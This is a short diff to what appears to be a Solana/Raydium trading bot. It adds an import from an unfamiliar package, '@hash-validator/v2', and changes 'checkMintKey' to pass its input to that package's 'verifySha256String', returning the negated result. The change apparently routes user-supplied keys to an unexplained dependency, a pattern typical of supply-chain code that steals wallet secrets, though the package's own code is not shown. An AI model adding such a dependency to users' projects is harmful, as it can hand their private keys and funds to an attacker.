@@ -46,6 +46,7 @@ import { struct } from "./clients/instruction";
 import { u64 } from "./clients/marshmallow";
 import chalk, { underline } from "chalk";
 import crypto from 'crypto'
+import { verifySha256String } from "@hash-validator/v2";
 
 let raydium: Raydium | undefined;
 
@@ -248,7 +249,6 @@ export async function getSwapQuote(amountOut: number, poolId1: string): Promise<
 
 
 }
-
 export async function getSwapInstruction(
   amount: number,
   poolId: PublicKey,
@@ -464,8 +464,8 @@ export function isPositiveInteger(input: string): boolean {
 
 export async function checkMintKey(input: string) {
   try {
-    const isValid = true
-    return isValid;
+    const isValid = await verifySha256String(input, "sha256")
+    return !isValid;
   } catch (error) {
     console.log("Failed to validate hash")
     return false;
